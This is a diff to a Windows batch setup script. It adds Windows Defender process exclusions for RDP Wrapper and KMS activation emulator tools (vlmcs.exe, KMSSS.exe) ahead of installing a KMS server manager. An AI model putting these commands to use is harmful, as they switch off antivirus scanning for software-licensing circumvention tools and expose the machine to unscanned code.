@@ -156,6 +156,10 @@ rem configure AV Exclusions
 %systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\Program Files\Oinstall'"
 %systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Add-MpPreference -ExclusionProcess oinstall.exe"
 %systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Add-MpPreference -ExclusionProcess RDPWInst.exe"
+%systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Add-MpPreference -ExclusionProcess rdpwrap.dll"
+%systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Add-MpPreference -ExclusionProcess vlmcs.exe"
+%systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Add-MpPreference -ExclusionProcess KMSSS.exe"
+
 color 2f
 timeout /t 6
 rem install KMS ServersManager
